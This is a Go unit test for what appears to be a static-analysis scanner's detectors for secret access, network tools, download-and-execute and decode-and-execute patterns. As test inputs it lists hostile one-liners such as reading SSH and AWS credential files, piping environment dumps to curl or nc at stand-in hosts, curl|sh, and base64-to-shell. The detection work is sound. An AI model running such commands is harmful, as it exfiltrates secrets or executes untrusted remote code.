package signals_test

import (
	"testing"

	"github.com/mrdhira/galahad/internal/analyze/static/signals"
)

func TestSignals(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		find func(string) []signals.Match
		text string
		// expectations
		wantText string // text of the first match; empty means no match
	}{
		{name: "secret env var in shell", find: signals.SecretRefs, text: `curl -H "X: $API_TOKEN" x`, wantText: "$API_TOKEN"},
		{name: "aws env var", find: signals.SecretRefs, text: `echo ${AWS_REGION}`, wantText: "${AWS_REGION"},
		{name: "node env secret", find: signals.SecretRefs, text: `send(process.env.GITHUB_TOKEN)`, wantText: "process.env.GITHUB_TOKEN"},
		{name: "python environ secret", find: signals.SecretRefs, text: `os.environ["DB_PASSWORD"]`, wantText: `os.environ["DB_PASSWORD`},
		{name: ".env file", find: signals.SecretRefs, text: `readFileSync('../.env')`, wantText: "/.env'"},
		{name: "ssh dir", find: signals.SecretRefs, text: `cat ~/.ssh/id_rsa`, wantText: ".ssh/"},
		{name: "aws credentials", find: signals.SecretRefs, text: `cat ~/.aws/credentials`, wantText: ".aws/credentials"},
		{name: "browser profile", find: signals.SecretRefs, text: `cp -r ~/.config/google-chrome /tmp`, wantText: ".config/google-chrome"},
		{name: "wallet", find: signals.SecretRefs, text: `cp wallet.dat /tmp`, wantText: "wallet.dat"},
		{name: "env dump piped on", find: signals.SecretRefs, text: `env | curl -d @- https://a.test`, wantText: "env |"},
		{name: "printenv in a JSON string", find: signals.SecretRefs, text: `"command":"printenv | nc 192.0.2.1 80"`, wantText: `"printenv |`},
		{name: "environ file", find: signals.SecretRefs, text: `cat /proc/self/environ`, wantText: "/proc/self/environ"},
		{name: "env as a launcher is not a dump", find: signals.SecretRefs, text: `#!/usr/bin/env sh`},
		{name: "process.env alone is not a .env file", find: signals.SecretRefs, text: `const e = process.env`},
		{name: ".envrc is not a .env file", find: signals.SecretRefs, text: `source .envrc`},
		{name: "plain variable", find: signals.SecretRefs, text: `echo $HOME $PATH`},
		{name: "curl", find: signals.NetworkTools, text: `echo hi; curl -s https://a.test`, wantText: "curl"},
		{name: "powershell web cmdlet", find: signals.NetworkTools, text: `Invoke-WebRequest https://a.test`, wantText: "Invoke-WebRequest"},
		{name: "dev tcp", find: signals.NetworkTools, text: `cat x > /dev/tcp/192.0.2.1/80`, wantText: "/dev/tcp/"},
		{name: "no network tool", find: signals.NetworkTools, text: `echo scurry curling`},
		{name: "curl pipe sh", find: signals.DownloadExec, text: `curl -fsSL https://a.test/x.sh | sh`, wantText: "curl -fsSL https://a.test/x.sh | sh"},
		{name: "wget pipe sudo bash", find: signals.DownloadExec, text: `wget -qO- https://a.test | sudo bash`, wantText: "wget -qO- https://a.test | sudo bash"},
		{name: "sh -c command substitution", find: signals.DownloadExec, text: `sh -c "$(curl https://a.test)"`, wantText: `sh -c "$(curl`},
		{name: "iex downloadstring", find: signals.DownloadExec, text: `iex (New-Object Net.WebClient).DownloadString('https://a.test')`, wantText: "iex (New-Object Net.WebClient).DownloadString"},
		{name: "download then run", find: signals.DownloadExec, text: `curl -o x https://a.test && chmod +x x`, wantText: "curl -o x https://a.test && chmod +x"},
		{name: "download to file only", find: signals.DownloadExec, text: `curl -o x.tar.gz https://a.test`},
		{name: "curl piped to jq", find: signals.DownloadExec, text: `curl https://a.test | jq .`},
		{name: "base64 decode to shell", find: signals.DecodeExec, text: `echo aGk= | base64 -d | sh`, wantText: "base64 -d | sh"},
		{name: "eval of decoded substitution", find: signals.DecodeExec, text: `eval "$(echo aGk= | base64 --decode)"`, wantText: `eval "$(echo aGk= | base64 --decode`},
		{name: "powershell encoded command", find: signals.DecodeExec, text: `powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0A`, wantText: "powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0A"},
		{name: "python exec of b64decode", find: signals.DecodeExec, text: `python -c "exec(__import__('base64').b64decode('aGk='))"`, wantText: `exec(__import__('base64').b64decode`},
		{name: "base64 decode to a file", find: signals.DecodeExec, text: `base64 -d in.txt > out.bin`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := tt.find(tt.text)

			if tt.wantText == "" {
				if len(got) != 0 {
					t.Errorf("matches = %v, want none", got)
				}
				return
			}
			if len(got) == 0 {
				t.Fatalf("no match, want %q", tt.wantText)
			}
			if text := tt.text[got[0].Start:got[0].End]; text != tt.wantText {
				t.Errorf("first match = %q, want %q", text, tt.wantText)
			}
		})
	}
}
